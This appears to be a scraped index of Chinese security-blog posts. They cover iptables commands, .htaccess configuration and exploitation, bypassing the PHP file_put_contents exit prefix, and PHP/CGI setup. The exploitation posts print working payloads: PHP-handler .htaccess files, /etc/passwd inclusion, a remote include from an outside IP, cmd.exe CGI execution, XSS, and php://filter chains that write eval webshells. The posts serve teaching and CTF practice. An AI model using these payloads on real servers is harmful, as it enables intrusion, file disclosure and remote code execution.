修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换-L 列出（list）指定链中所有的规则进行查看-E 重命名用户定义的链，不改变链本身-F 清空（flush）-N 新建（new-chain）一条用户自己定义的规则链-X 删除指定表中用户自定义的规则链（delete-chain）-P 设置指定链的默认策略（policy）-Z 将所有表的所有链的字节和数据包计数器清零-n 使用数字形式（numeric）显示输出结果-v 查看规则表详细信息（verbose）的信息-V 查看版本(version)-h 获取帮助（help） 常用实例 1、清除已有iptables规则 123iptables -F iptables -X iptables -Z 2、开放指定的端口 123456789iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本地回环接口(即运行本机访问本机) iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT #允许已建立的或相关连的通行 iptables -A OUTPUT -j ACCEPT #允许所有本机向外的访问 iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许访问22端口 iptables -A INPUT -p tcp --dport 80 -j ACCEPT #允许访问80端口 iptables -A INPUT -p tcp --dport 21 -j ACCEPT #允许ftp服务的21端口 iptables -A INPUT -p tcp --dport 20 -j ACCEPT #允许FTP服务的20端口 iptables -A INPUT -j reject #禁止其他未允许的规则访问 iptables -A FORWARD -j REJECT #禁止其他未允许的规则访问 3、屏蔽IP 1234iptables -I INPUT -s 123.45.6.7 -j DROP #屏蔽单个IP的命令 iptables -I INPUT -s 123.0.0.0/8 -j DROP #封整个段即从123.0.0.1到123.255.255.254的命令 iptables -I INPUT -s 124.45.0.0/16 -j DROP #封IP段即从123.45.0.1到123.45.255.254的命令 iptables -I INPUT -s 123.45.6.0/24 -j DROP #封IP段即从123.45.6.1到123.45.6.254的命令 4、查看已添加的iptables规则 1iptables -L -n -v 5、删除已添加的iptables规则 将所有iptables以序号标记显示，执行： 1iptables -L -n --line-numbers 比如要删除INPUT里序号为8的规则，执行： 1iptables -D INPUT 8 参考文章： Linux防火墙iptables规则设置：https://www.cnblogs.com/zaizai1573/p/11885271.html","categories":[],"tags":[],"author":"ye1s"},{"title":"Apache的.htaccess利用技巧","slug":"Apache中-htaccess文件利用","date":"2020-09-06T05:05:00.000Z","updated":"2020-09-17T06:56:10.594Z","comments":true,"path":"article/6b6ad1b0.html","link":"","permalink":"https://blog.cfyqy.com/article/6b6ad1b0.html","excerpt":"首发于先知社区：https://xz.aliyun.com/t/8267对 htaccess 文件的常见利用方式进行一次总结","text":"首发于先知社区：https://xz.aliyun.com/t/8267对 htaccess 文件的常见利用方式进行一次总结 0x1简介0x1.1基本概念.htaccess 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。.htaccess 中有 # 单行注释符, 且支持 \\拼接上下两行。 0x1.2作用范围.htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 0x1.3配置文件启动 .htaccess，需要在服务器的主配置文件将 AllowOverride 设置为 All，如 apache2.conf 1AllowOverride All #启动.htaccess文件的使用 也可以将 .htaccess 修改为其他名 1AccessFileName .config #将.htaccess修改为.config 0x2常见指令.htaccess 可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如需了解详细功能可看这篇文章 http://www.htaccess-guide.com/ ， 这里就不一一介绍，主要讲解几种常利用的指令。 0x2.1SetHandlerSetHandler 可以强制所有匹配的文件被一个指定的处理器处理用法： 1SetHandler handler-name|None 示例1： 1SetHandler application&#x2F;x-httpd-php 此时当前目录及其子目录下所有文件都会被当做 php 解析 示例2： 1SetHandler server-status apache的服务器状态信息(默认关闭)，可以查看所有访问本站的记录访问任意不存在的文件，加参数 ?refresh=5 来实现每隔 5s 自动刷新 0x2.2 AddHandlerAddHandler 可以在文件扩展名与特定的处理器之间建立映射用法: 1AddHandler handler-name extension [extension] ... 例如： 1AddHandler cgi-script .xxx 将扩展名为 .xxx 的文件作为 CGI 脚本来处理 0x2.3AddTypeAddType 可以将给定的文件扩展名映射到指定的内容类型用法： 1AddType media-type extension [extension] ... 示例： 1AddType application&#x2F;x-httpd-php .gif 将以 gif 为后缀的文件当做 php 解析 1AddType application&#x2F;x-httpd-php png jpg gif 将以 .png .jpg .gif 多个后缀当做 php 解析 0x2.4php_value当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess 文件中的指令来修改 php 的配置设定。需要有AllowOverride Options 或AllowOverride All 权限才可以。 php_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag。 用法： 1php_value name value 查看配置可被设定范围由上可知 .htaccess 只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令。查看php.ini 配置选项列表,寻找可利用指令 (1) 文件包含配置选项 auto_prepend_file：在主文件解析之前自动解析包含的文件 auto_append_file：在主文件解析后自动解析包含的文件 例如: 1php_value auto_prepend_file images.png 访问一个 php 文件时，在该文件解析之前会先自动解析 images.png 文件 (2) 绕过preg_match例如： 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。 0x2.5php_flagphp_flag 用来设定布尔值的 php 配置指令用法： 1php_flag name on|off 查看php.ini 配置选项列表,寻找可利用指令可以将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露 1php_flag engine 0 0x3利用方式0x3.1文件解析经常出现在文件上传的黑名单没有限制 .htaceess 后缀，通过上传 .htaccess 文件，再上传图片，使图片的 php 恶意代码得以被解析执行 .htaccess 文件内容有如下两种 1.SetHandler 指令 1234# 将images.png 当做 PHP 执行&lt;FilesMatch \"images.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 2.AddType 12# 将 .jpg 当做 PHP 文件解析AddType application/x-httpd-php .png 0x3.2文件包含0x3.2.1本地文件包含通过 php_value 来设置 auto_prepend_file或者 auto_append_file 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 php 文件来触发。 .htaccess 分别通过这两个配置选项来包含 /etc/passwd,并访问同目录下的 index.php文件。 auto_prepend_file 1php_value auto_prepend_file &#x2F;etc&#x2F;passwd auto_append_file 1php_value auto_append_file &#x2F;etc&#x2F;passwd 0x3.2.2远程文件包含PHP 的 all_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启。这里为了演示，就在 php.ini 中设置 all_url_include 为 On 1php_value auto_append_file http:&#x2F;&#x2F;10.87.9.156&#x2F;phpinfo.txt 0x3.3源码泄露利用 php_flag 将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露 1php_flag engine 0 这里在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码 0x3.4代码执行1.利用伪协议all_url_fopen、all_url_include 为 On 12php_value auto_append_file data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;#php_value auto_append_file data:&#x2F;&#x2F;text&#x2F;plain,%3C%3Fphp+phpinfo%28%29%3B 2.解析.htaccess方法一： 12php_value auto_append_file .htaccess#&lt;?php phpinfo(); 方法二：这种适合同目录或子目录没有 php 文件。需要先设置允许可访问 .htaccess 文件 12345&lt;Files ~ &quot;^.ht&quot;&gt; Require all granted Order allow,deny Allow from all&lt;&#x2F;Files&gt; 将 .htaccess指定当做 php文件处理 12SetHandler application&#x2F;x-httpd-php# &lt;?php phpinfo(); ?&gt; 0x3.5命令执行0x3.5.1CGI启动cgi_module 需要加载，即 apache 配置文件中有 1LoadModule cgi_module modules&#x2F;mod_cgi.so .htaccess内容 12Options ExecCGI #允许CGI执行AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析 ce.xx 12#!C:&#x2F;Windows&#x2F;System32&#x2F;cmd.exe &#x2F;k start calc.exe6 例题可看 De1CTF2020 check in 0x3.5.2FastCGI启动mod_fcgid.so需要被加载。即 apache 配置文件中有 1LoadModule fcgid_module modules&#x2F;mod_fcgid.so .htaccess 123Options +ExecCGIAddHandler fcgid-script .xxFcgidWrapper &quot;C:&#x2F;Windows&#x2F;System32&#x2F;cmd.exe &#x2F;k start calc.exe&quot; .xx ce.xx 内容随意 0x3.6XSS0x3.6.1 highlight_file.htaccess 1php_value highlight.comment &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39; 其中的 highlight.comment 也可以换成如下其他选项 index.php 123&lt;?phphighlight_file(__FILE__);&#x2F;&#x2F; comment 0x3.6.2错误消息链接index.php ： 12&lt;?phpinclude(&#39;foo&#39;);#foo报错 .htaccess 123php_flag display_errors 1php_flag html_errors 1php_value docref_root &quot;&#39;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&quot; 0x3.7自定义错误文件error.php 1&lt;?php include('shell');#报错页面 .htaccess 12php_value error_log &#x2F;tmp&#x2F;www&#x2F;html&#x2F;shell.php php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot; 访问 error.php，会报错并记录在 shell.php 文件中因为会经过 html 编码，所以需要 UTF-7 来绕过。 .htaccess 123456789# 第一次php_value error_log &#x2F;tmp&#x2F;shell #定义错误路径#---- &quot;&lt;?php phpinfo(); __halt_compiler();&quot; in UTF-7:php_value include_path &quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;# 第二次php_value include_path &quot;&#x2F;tmp&quot; #将include()的默认路径改变php_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 例题可看X-NUCA-ezphp 0x4参考链接https://www.anquanke.com/post/id/205098https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.htmlhttp://httpd.apache.org/docs/2.4/https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheethttps://www.freebuf.com/vuls/218495.html","categories":[],"tags":[],"author":"ye1s"},{"title":"htaccess简识","slug":"htaccess利用","date":"2020-09-01T14:49:00.000Z","updated":"2020-09-17T06:56:40.556Z","comments":true,"path":"article/2b398cc5.html","link":"","permalink":"https://blog.cfyqy.com/article/2b398cc5.html","excerpt":"对htaccess的认识只停留在文件上传黑名单的绕过，还是得好好学习一下。","text":"对htaccess的认识只停留在文件上传黑名单的绕过，还是得好好学习一下。 htaccess简介概念.htaccess 文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。 概述来说，htaccess 文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 作用范围.htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 配置通常情况下，Apache是默认启用 .htaccess 的，但是为了以防万一，请检查一下自己站点的配置文件，如 httpd.conf，是否有这行： 1AllowOverride All 这行允许重写配置文件。也就是如果能够从 .htaccess 加载配置文件，那么就以 .htaccess 为配置文件对其所在目录进行配置。 功能.htaccess简介通过功能，顺便认识一下语法 htaccess访问控制(Allow/Deny)Order命令为了限制用户访问一些关键目录，.htaccess可以提供目录访问限制。你只需要在要限制的目录中，加入如下.htaccess文件： 1deny from all 这会限制所有用户通过浏览器访问该目录，允许指定IP地址的访问： 12Order Allow,DenyAllow from 192.168.0.0/16 Order命令是一个难点，也是配置apache的基础，它决定了Apache处理访问规则的顺序。 通过Allow,Deny参数，Apache首先找到并应用Allow命令，然后应用Deny命令，以阻止所有访问。 通过Deny,Allow参数，Apache首先找到并应用Deny命令，然后应用Allow命令，以允许所有访问。 然后我在本地尝试发现如下配置，也限制了192.168.0.0/16网段主机的访问，去掉 Deny from All 则可以访问 123Order Allow,DenyDeny from AllAllow from 192.168.0.0/16 过滤域名或网络主机(Allow/Deny)下例可以限制所有含有“domain.com”的网络主机访问网站： 123Order Allow,DenyAllow from allDeny from .*domain\\.com.* 禁止访问指定文件(Files)Files命令可以用于过滤指定文件： 1234&lt;Files test.php&gt; order allow,deny deny from all&lt;/Files&gt; 禁止访问指定文件类型(FilesMatch)下面的代码将限制访问所有.log和.exe文件： 1234&lt;FilesMatch \".(log|exe)$\"&gt; Order allow,deny Deny from all&lt;/FilesMatch&gt; 我们还可以通过Files命令描述文件类型，但是需要在命令后面加一个波浪线(~)，该符号启用Files命令的正则表达解析功能： 12345&lt;Files ~ \"^.*\\.([Ll][Oo][Gg])|([eE][xX][eE])\"&gt; Order allow,deny Deny from all Satisfy All&lt;/Files&gt; 有以下几点需要注意： Files之后的波浪线用于开启“正则表达式”分析。请注意，这是个过时的用法，Apache更推荐使用&lt;FilesMatch&gt;指令 正则表达式必须在双引号之间，有关htaccess的正则表达式用法，请查阅本站《.htaccess正则表达式》一文。 双引号中的“管道符”(|)用于将两种文件类型（.log和.exe）分开，相当于逻辑“或” Order命令必须嵌在Files节(Section)中，否则将会应用到所有文件 Satisfy All表示必须同时满足主机级别(Allow/Denay)和用户级别(Require)的限制，All是默认值，该行可以省略。 高级访问控制(Rewrite)还可以通过运用Rewrite实现更强大的访问控制详情可看：http://lesca.me/archives/htaccess-rewrite.html#access_control 开启mod_rewrite 1sudo a2enmod rewrite 需要注意点： FollowSymlinks必须启用，这是rewrite引擎的安全需求。 通常FollowSymlinks在Apache的主配置文件中就已经启用了，所以通常可以省略。 RewriteEngine命令用于启用rewrite引擎 IfModule命令用于判断Apache是否安装了mod_rewrite模块，之后笔者会省略该命令，但不代表这是个好习惯 mod_rewrite会处理所有提交给Apache的URL请求，并与之后的规则进行匹配 密码保护与验证配置.htaccess1234AuthType BasicAuthName \"restricted area\"AuthUserFile /var/www/passwdrequire valid-user 这个配置文件可以保护.htaccess所在的整个目录，简单说明下参数： AuthType：验证类型为基本类型，密码以明文方式传输到服务器上 AuthName：验证提示，会出现在验证对话框中 AuthUserFile：验证配置文件，用于匹配用户名与密码，该密码是加密保存的 require valid-user：只有在AuthUserFile中出现的用户才可以通过验证生成htpasses文件如何生成passwd文件呢？我们通过htpasswd命令生成密码文件：1htpasswd -c /var/www/passwd 它会提示你输入密码，并确认。之后将密码文件passwd保存在/var/www/目录下 对文件进行密码保护保护与.htaccess在同一目录下的文件secure.php： 1234567# password-protect single file&lt;Files secure.php&gt;AuthType BasicAuthName \"Prompt\"AuthUserFile /var/www/passwdRequire valid-user&lt;/Files&gt; 保护.htaccess所在目录下的多个文件： 1234567# password-protect multiple files&lt;FilesMatch \"^(execute|index|secure|insanity|biscuit)*$\"&gt;AuthType basicAuthName \"Development\"AuthUserFile /var/www/passwdRequire valid-user&lt;/FilesMatch&gt; 对指定IP进行密码保护仅允许IP地址为192.168.10.5的主机直接访问该目录，其他IP需要验证。 123456AuthType BasicAuthName \"Personal\"AuthUserFile /var/www/passwdRequire valid-userAllow from 192.168.10.5Satisfy Any 目录浏览与主页启用目录浏览1Options All +Indexes 禁用目录浏览1Options All -Indexes 我们还可以通过IndexIgnore指令来禁用目录浏览。 1IndexIgnore * 通过IndexIgnore指令，我们可以禁止对指定类型的文件浏览： 1IndexIgnore *.wmv *.mp4 *.avi *.etc 自定义目录浏览如果你希望Apache在展示你的WEB目录时看起来与众不同，那么你需要启用FancyIndexing选项： 123&lt;IfModule mod_autoindex.c&gt; IndexOptions FancyIndexing &lt;&#x2F;ifModule&gt; 通过这个选项，你可以实现自定义图标、添加文件类型描述、按日期排序等。 配置目录主页文件即使启用了目录浏览，Apache未必会展示该目录的内容，因为该目录可能存在像index.htm这样的默认主页文件。Apache会有限展示主页文件，我们可以通过.htaccess设置： 1DirectoryIndex index.html index.php index.htm 配置错误页面如果Apache遇到错误，就会输出错误页面。配置自定义的错误页面，也许可以挽留即将离开的用户。 12345# custom error documentsErrorDocument 401 &#x2F;err&#x2F;401.phpErrorDocument 403 &#x2F;err&#x2F;403.phpErrorDocument 404 &#x2F;err&#x2F;404.phpErrorDocument 500 &#x2F;err&#x2F;500.php 重定向old_dir 重新定向到 new_dir, 也可以定向到其他 WEB 站点目录 1Redirect /old_dir/ http://www.yourdomain.com/new_dir/index.html 参考文章： 深究.htaccess的原理，和用户利用其恶意篡改服务器配值导致的深层安全问题借github上韩国师傅的一个源码实例再次理解.htaccess的功效PHP htaccess injection cheat sheet .htaccess简介.htaccess 详解Apache .htaccess Guide, Tutorials and Articles.htaccess利用与Bypass方式总结Apache中.htaccess文件利用的总结与新思路拓展","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"htaccess","slug":"htaccess","permalink":"https://blog.cfyqy.com/tags/htaccess/"}],"author":"ye1s"},{"title":"PHP file_put_contents 的死亡绕过","slug":"PHP-exist-绕过","date":"2020-08-30T15:15:00.000Z","updated":"2020-09-01T16:19:42.819Z","comments":true,"path":"article/13364c14.html","link":"","permalink":"https://blog.cfyqy.com/article/13364c14.html","excerpt":"php的死亡绕过","text":"php的死亡绕过 file_put_content大概有三种情形出现； 123file_put_contents($filename,\"&lt;?php exit();\".$content);file_put_contents($content,\"&lt;?php exit();\".$content);file_put_contents($filename,$content . \"\\nxxxxxx\"); 情况一示例代码f1.php 123456&lt;?php$filename=$_GET['filename'];$content=$_POST['content'];file_put_contents($filename,\"&lt;?php exit();\".$content);?&gt; base64编码绕过这里需要将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”,所以补上一位就可以完全转化 12345&lt;?php$str=\"&lt;?php phpinfo();?&gt;\";$encode=base64_encode($str);print($encode);?&gt; rot13 编码绕过ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。 12345&lt;?php$str=\"&lt;?php phpinfo();?&gt;\";$encode=str_rot13($str);print($encode);?&gt; 利用条件：在PHP不开启short_open_tag时，php不认识&lt;?cuc rkvg();这个字符串，当然也就不会执行了。 .htaccess的预包含利用strip_tags() (php7.3后移除)函数剥去字符串中的 HTML、XML 以及 PHP 的标签。 利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件 利用条件： flag文件的位置，和文件的名字 这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件。 过滤器编码组合strip_tags和base64利用string.strip_tags可以过滤掉html标签，将标签内的所有内容进行删去，然后再进行base64解码，成功写入shell。 三个过滤器本地没试成功 12$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=s1mple.php 具体看https://xz.aliyun.com/t/8163#toc-5 情况二示例代码f2.php 1234&lt;?php$content=$_GET['content'];file_put_contents($content,\"&lt;?php exit();\".$content);?&gt; .htacess包含1f2.php?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags&#x2F;?&gt;php_value%20auto_prepend_file%20&#x2F;flag%0a%23&#x2F;resource&#x3D;.htaccess Base64payload：： 12php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.phpphp://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php 看起来顺理成章，进行拼接之后就是 1&lt;?php exit();php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;PD9waHAgcGhwaW5mbygpOz8+.php 然后会对其进行一次整体的base64-decode。从而分解掉死亡代码，但是有个小问题，当时我也有点不解，一直无法生成content；虽然文件创建成功，但是就是无法生成content。原因： ‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的 去掉等号之过滤器嵌套base64payload 1php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php 发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去； 改payload为此： 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;?&gt;PD9waHAgcGhwaW5mbygpOz8%2B&#x2F;..&#x2F;phpinfo.php 我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成phpinfo.php文件 去掉等号之直接对内容进行变性另类base641f2.php?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;&lt;?|string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;?&gt;PD9waHAgcGhwaW5mbygpOz8%2B&#x2F;..&#x2F;phpinfo.php 这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接写在中进行过滤掉，然后base64-decode再对原本内容的&lt;?php exit();进行转码，从而达到分解死亡代码的效果 rot131f2.php?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=phpinfo.php convert.iconv这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;其用法： 12iconv ( string $in_charset , string $out_charset , string $str ) string 将字符串 str 从 in_charset 转换编码到 out_charset usc-2通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上） 1234&lt;?php$str='&lt;?php @eval($_POST[y]); ?&gt;';echo iconv(\"UCS-2LE\",\"UCS-2BE\",$str);?&gt; payload: 1f2.php?content=php://filter/write=string.strip_tags/?&gt;php_value%20auto_prepend_file%20D:\\env\\phpstudy_pro\\WWW\\flag%0a%23/resource=.htaccess usc-4活用convert.iconv。可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数； 1234&lt;?php$str='&lt;?php @eval($_POST[\"y\"]); ?&gt;';echo iconv(\"UCS-4LE\",\"UCS-4BE\",$str);?&gt; payload 1f2.php?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$\"[TS)]\"y&gt;? ;/resource=phpinfo.php utf-8与utf-7之间的转化123456789&lt;?phpecho iconv(\"UTF-8\",\"UTF-7\",\"=\");echo \"\\n\";echo iconv(\"UTF-8\",\"UTF-7\",\"PD9waHAgcGhwaW5mbygpOz8+\");?&gt;//output://+AD0-//PD9waHAgcGhwaW5mbygpOz8+- 这里发现生成的是+AD0-,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shellpayload 1f2.php?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;PD9waHAgcGhwaW5mbygpOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;phpinfo.php 情况三f3.php 1234567&lt;?phperror_reporting(0);$content=$_POST['content'];$filename=$_GET['filename'];file_put_contents($filename, $content.\"\\njust_test\");highlight_file(__FILE__);?&gt; 这种情形一般考点都是禁止有特殊起始符和结束符号的语言，举个例子，如果题目没有ban掉php，那么我们可以轻而易举的写入php代码，因为php代码有特殊的起始符和结束符，所以后面的杂糅代码，并不会对其产生什么影响 所以这类问题的考点，往往在于我们没有办法去写入这类的有特殊起始符和结束符号的语言，往往是需要想办法处理掉杂糅代码的。 常见的考点是利用.htaccess进行操作；都知道，.htaccess文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用注释符将杂糅的代码进行注释，然后才可以正常访问。 这里对于换行符我们直接进行\\n注释即可。然后再嵌入#注释符，从而达到单行注释就可以将杂糅代码注释掉的效果；载荷效果如下 参考文章： file_put_content和死亡·杂糅代码之缘","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"exist","slug":"exist","permalink":"https://blog.cfyqy.com/tags/exist/"}],"author":"ye1s"},{"title":"PHP安装配置","slug":"PHP安装配置","date":"2020-08-28T16:00:00.000Z","updated":"2020-08-30T15:16:24.828Z","comments":true,"path":"article/afd97ba6.html","link":"","permalink":"https://blog.cfyqy.com/article/afd97ba6.html","excerpt":"php安装配置记录","text":"php安装配置记录 基础页面请求处理静态文件处理动态文件处理 相关概念 CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。 FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似。 PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。 PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理 CGICGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等 CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。 CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给apache和php。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。 但是CGI有个蛋疼的地方，就是每一次web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式，这样一在大规模并发下，就死翘翘了。 FastCGIFastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。它还支持分布式的运算, 即 FastCGI 程序可以在网站服务器以外的主机上执行，并且接受来自其它网站服务器来的请求。 FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。 Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了 FastCGI与CGI特点： 对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。 由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存 PHP-CGIPHP-CGI就是PHP实现的自带的FastCGI管理器。 虽然是php官方出品，但是这丫的却一点也不给力，性能太差，而且也很麻烦不人性化，主要体现在： php-cgi变更php.ini配置后，需重启php-cgi才能让新的php-ini生效，不可以平滑重启。 直接杀死php-cgi进程，php就不能运行了。 上面2个问题，一直让很多人病垢了很久，所以很多人一直还是在用 Module 方式。 直到 2004年一个叫 Andrei Nigmatulin的屌丝发明了PHP-FPM ，这神器的出现就彻底打破了这种局面，这是一个PHP专用的 fastcgi 管理器，它很爽的克服了上面2个问题，而且，还表现在其他方面更表现强劲 PHP-FPMPHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。 因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序 总结如果要搭建一个高性能的PHP WEB服务器，目前最佳的方式是Apache/Nginx +FastCGI +PHP-FPM(+PHP-CGI)方式了，不要再使用 Module加载或者 CGI 方式啦：） PHP安装ubuntu添加源地址执行三条命令,添加php的源地址，更新，安装 1234sudo apt-get install software-properties-commonsudo add-apt-repository -y ppa:ondrej/phpsudo apt-get updatesudo apt-get install php7.2 查看有没有php7的包 1sudo apt list | grep php 安装PHPnginx使用php的话要用到php7.2-fpm,所以要安装 1sudo apt-get install php7.2-mysql php7.2-fpm php7.2-curl php7.2-xml php7.2-gd php7.2-mbstring php-memcached php7.2-zip 